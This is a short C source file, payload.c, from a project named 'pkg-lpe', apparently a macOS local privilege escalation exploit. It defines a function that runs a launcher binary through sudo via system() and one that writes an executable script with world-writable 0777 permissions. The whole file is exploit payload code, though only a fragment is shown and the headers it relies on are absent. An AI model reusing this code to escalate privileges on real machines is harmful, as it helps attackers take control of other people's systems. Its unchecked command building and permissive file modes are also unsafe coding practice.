//
//  payload.c
//  pkg-lpe
//
//  Created by Michael on 25/05/2023.
//

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include "logging.h"
#include "payload.h"

void LaunchSIPPrompt(void)
{
    char buff[BUFSIZ] = {0};
    sprintf(&buff[0], "/usr/bin/sudo %s", LAUNCHER_PATH);
    system(buff);
}

int WriteExecutableScript(char* dest, char* contents, size_t contentsLength)
{
    int       fd       =    open(dest, O_RDWR | O_CREAT, 0777);
    FILE*     fp       =    fdopen(fd, "w+");
    size_t    write    =    fwrite(contents, 1, contentsLength, fp);
    
    SUCCESS("%s: wrote %ld bytes\n", dest, write);
    fclose(fp);
    
    return !(write == contentsLength);
}
